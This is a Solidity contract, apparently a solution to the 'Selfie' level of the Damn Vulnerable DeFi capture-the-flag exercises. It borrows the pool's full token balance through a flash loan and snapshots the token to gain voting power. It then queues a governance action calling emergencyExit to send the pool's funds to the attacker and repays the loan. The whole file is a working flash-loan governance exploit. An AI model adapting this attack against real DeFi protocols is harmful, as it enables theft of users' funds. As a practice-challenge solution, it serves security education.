// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";

contract Exploit_Selfie is IERC3156FlashBorrower {
    address attackerEOA;
    DamnValuableTokenSnapshot token;
    SelfiePool pool;
    SimpleGovernance governance;

    constructor(
        DamnValuableTokenSnapshot _token,
        SelfiePool _pool,
        SimpleGovernance _governance
    ) {
        attackerEOA = msg.sender;
        token = _token;
        pool = _pool;
        governance = _governance;
    }

    function exploit() external {
        uint256 poolBalance = token.balanceOf(address(pool));
        pool.flashLoan(this, address(token), poolBalance, "x0");
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes memory
    ) external returns (bytes32) {
        //take a snapshot because it is checked in '_hasEnoughVotes(address)'
        token.snapshot();
        //contruct a malicious tx payload
        bytes memory payload = abi.encodeWithSignature("emergencyExit(address)",attackerEOA);
        governance.queueAction(address(pool), 0, payload);
        //approve flash loan pool so it can pull back up the amount
        token.approve(address(pool), amount);
        //return CALLBACK_SUCCESS
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
